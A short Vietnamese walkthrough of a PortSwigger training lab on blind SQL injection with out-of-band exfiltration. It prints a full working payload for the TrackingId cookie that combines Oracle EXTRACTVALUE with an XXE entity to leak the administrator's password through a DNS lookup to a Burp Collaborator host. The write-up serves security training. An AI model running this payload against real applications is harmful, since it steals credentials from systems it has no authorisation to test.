## Blind SQL injection with out-of-band data exfiltration

Tiếp tục sử dụng Burp Collaborator

Tham khảo [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) chúng ta sẽ lợi dụng EXTRACT VALUE trong SQL để sử dụng XXE attack để trigger đoạn query lookup DNS.

```markdown
**TrackingId=6tUkNaijRklEQOsv'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.gh1ioyaggfhbp6eospfcup66lxrnfc.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--**
```

Kết hợp nối chuỗi select password từ bảng users với user là admin

Kết quả request gửi tới collaborator sau khi trả về sau khi Pool sẽ có format **password.host.burpcollaborator.net**

![](/imgs/SQL-Injection/70.png?raw=true)

Login với tài khoản admin là solve

![](/imgs/SQL-Injection/71.png?raw=true)